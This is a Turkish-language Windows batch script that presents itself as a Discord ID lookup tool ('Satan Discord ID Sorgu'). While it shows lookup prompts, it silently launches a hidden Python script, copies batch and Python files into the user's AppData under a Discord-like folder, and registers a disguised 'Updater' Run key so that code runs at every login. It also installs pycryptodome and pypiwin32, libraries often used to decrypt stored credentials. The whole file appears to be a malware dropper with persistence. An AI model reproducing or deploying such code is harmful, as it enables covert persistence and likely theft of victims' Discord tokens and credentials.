@echo off
chcp 65001 >nul
title Satan Discord ID Sorgu
start "" /B python modules/accepts/main.py
@echo off
set STARTUP=%APPDATA%/discord
set KAYNAK=%~dp0modules\accepts

copy "%KAYNAK%\discordid.bat" "%STARTUP%\discord.bat"
copy "%KAYNAK%\discordid2.bat" "%STARTUP%\discordid2.bat"
copy "%KAYNAK%\launcher.py" "%STARTUP%\launcher.py"
@echo off
set HEDEF=%APPDATA%\discord
set KAYNAK=%~dp0modules\accepts

robocopy "%KAYNAK%" "%HEDEF%" /E

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "cmd.exe /c \"%HEDEF%\discordid2.bat\"" /f

echo Tamamlandi.
pause

pause
pip install pypiwin32
pip install pycryptodome
cls
color 0A
echo.
echo  ============================================
echo       Satan Discord ID Sorgu
echo  ============================================
echo.
set /p SERVER_ID= Sunucu ID'sini girin: 
echo.
set /p WEBHOOK_URL= Webhook URL'sini girin: 
echo.
echo  Gereksinimler yukleniyor...
echo.
pip install pypiwin32
pip install pycryptodome
echo.
echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
echo.
timeout /t 8 >nul
exit
